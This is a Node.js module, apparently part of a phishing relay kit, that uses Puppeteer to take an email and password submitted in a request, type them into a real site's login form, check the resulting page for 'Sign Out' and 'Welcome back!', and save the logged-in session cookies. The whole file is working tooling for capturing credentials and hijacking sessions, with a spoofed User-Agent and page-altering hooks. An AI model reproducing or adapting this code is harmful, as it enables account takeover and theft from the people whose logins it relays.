const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                const email = `[name="userLoginId"]`
                await page.waitForSelector(email)
                let clearInputs = [email]
                for (let i = 0; i < clearInputs.length; i++) {
                    await page.focus(clearInputs[i])
                    await page.keyboard.down('Control')
                    await page.keyboard.press('A')
                    await page.keyboard.up('Control')
                    await page.keyboard.press('Backspace')
                }

                await page.type(email, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["Sign Out", "Welcome back!"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-login") {
                const email = `[name="userLoginId"]`
                const password = `[name="password"]`

                await page.waitForSelector(email)
                await page.waitForSelector(password)
                let clearInputs = [email, password]
                for (let i = 0; i < clearInputs.length; i++) {
                    await page.focus(clearInputs[i])
                    await page.keyboard.down('Control')
                    await page.keyboard.press('A')
                    await page.keyboard.up('Control')
                    await page.keyboard.press('Backspace')
                }

                await page.type(email, body.userLoginId)
                await page.type(password, body.password)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch"
                        || response.request().resourceType() == 'xhr') {
                        await new Promise(re => setTimeout(re, 3000))
                        return true
                    }
                })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }